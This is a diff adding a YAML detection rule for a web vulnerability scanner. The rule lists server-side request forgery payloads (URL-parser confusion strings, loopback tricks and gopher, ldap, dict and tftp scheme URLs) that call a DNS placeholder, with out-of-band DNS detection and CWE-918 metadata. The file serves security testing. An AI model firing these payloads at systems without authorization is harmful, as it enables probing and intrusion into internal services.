@@ -1,0 +1,32 @@
+generate:
+  - payload:
+    - 'DNS_MARKER'
+    - 'http://DNS_MARKER/'
+    - 'http://DNS_MARKER &@2.2.2.2# @3.3.3.3/'
+    - 'http://1.1.1.1 &@DNS_MARKER# @3.3.3.3/'
+    - 'http://1.1.1.1 &@2.2.2.2# @DNS_MARKER/'
+    - 'http://127.1.1.1:80\@DNS_MARKER:80/'
+    - 'http://127.1.1.1:80\@@DNS_MARKER:80/'
+    - 'http://127.1.1.1:80:\@@DNS_MARKER:80/'
+    - 'http://127.1.1.1:80#\@DNS_MARKER:80/'
+    - 'jar:http://DNS_MARKER!/'
+    - 'dict://DNS_MARKER:11111/'
+    - 'sftp://DNS_MARKER:8022/'
+    - 'tftp://DNS_MARKER:69/somefile'
+    - 'ldap://DNS_MARKER:389/%0astats%0aquit'
+    - 'gopher://DNS_MARKER:70/'
+  - method:
+    - replace
+detect:
+  - oob:
+    - dns
+meta-info:
+  - type: rce
+  - threat: 70
+  - title: "Server Side Request Forgery (SSRF)"
+  - description: "The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (path traversal, etc)."
+  - applicable_for: ["attack_rechecker"]
+  - tags:
+    - SSRF
+    - Server Side Request Forgery
+    - CWE-918
